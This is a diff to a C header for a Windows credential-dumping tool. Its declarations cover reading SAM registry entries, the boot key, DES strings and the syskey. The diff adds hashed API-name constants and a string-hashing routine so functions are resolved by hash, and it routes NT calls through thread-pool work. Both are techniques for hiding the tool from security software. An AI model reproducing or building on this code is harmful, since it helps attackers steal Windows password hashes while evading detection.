@@ -11,6 +11,18 @@
 
 #define PROXY_NT_CALLS	1
 
+#define NtOpenKey_RFDT   0xB9491C52
+#define NtQueryKey_RFDT          0x3C34AAD6
+#define NtEnumerateKey_RFDT      0x8E67DF26
+#define NtQueryValueKey_RFDT     0x59F4E4D3
+#define NtEnumerateValueKey_RFDT         0x0AE54B23
+#define NtClose_RFDT     0x67741D8D
+#define TpAllocWork_RFDT         0x4F054787
+#define TpPostWork_RFDT          0xE91D6BE2
+#define TpReleaseWork_RFDT       0x50595ADD
+#define RtlInitUnicodeString_RFDT        0xB1AFABD9
+#define ntdlldll_RFDT    0x8C6C8F3D
+
 typedef FARPROC(WINAPI* myMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT);
 
 typedef NTSTATUS(WINAPI* myNtOpenKey)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
@@ -32,7 +44,7 @@ typedef struct _sam {
 	WCHAR classes[MAX_KEY_VALUE_LENGTH];
 } *PSAM, SAM;
 
-FARPROC myGetProcAddress(PCHAR moduleName, PCHAR exportName);
+FARPROC myGetProcAddress(DWORD moduleName, DWORD exportName);
 void getSAM(PSAM samRegEntries[], PULONG size);
 void getClasses(PSAM samRegEntry);
 void getBootKey(PSAM samRegEntry, PBYTE bootKeyRet);
@@ -42,3 +54,4 @@ void getDESStr1(PSAM samRegEntry, PBYTE desStr1Ret);
 void getDESStr2(PSAM samRegEntry, PBYTE desStr2Ret);
 void getAuxSyskey(PSAM samRegEntry, PBYTE auxSyskeyRet);
 void toUpperStr(char* s);
+DWORD HashString2A(LPCSTR String);
